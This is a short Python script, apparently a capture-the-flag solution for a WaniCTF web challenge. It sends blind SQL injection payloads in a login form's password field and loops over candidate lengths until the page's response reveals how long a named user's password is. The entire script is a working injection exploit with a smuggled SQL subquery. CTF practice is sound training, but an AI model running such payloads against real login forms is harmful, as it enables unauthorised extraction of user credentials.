#!/usr/bin/python3

import requests

url = 'https://watch.web.wanictf.org/'
email = "wanictf21spring@gmail.com"
response = "Crocodiles or true crocodiles are large semiaquatic reptiles that live throughout the tropics in Africa, Asia, the Americas and Australia."

for i in range(1, 100):
    payload = {
        "email": email,
        "password": f"' OR (SELECT LENGTH(password) FROM users WHERE email = '{email}') = {i};"
    }
    r = requests.post(url, data=payload)
    if response in r.text:
        print(f"length of the password is {i}")
        break

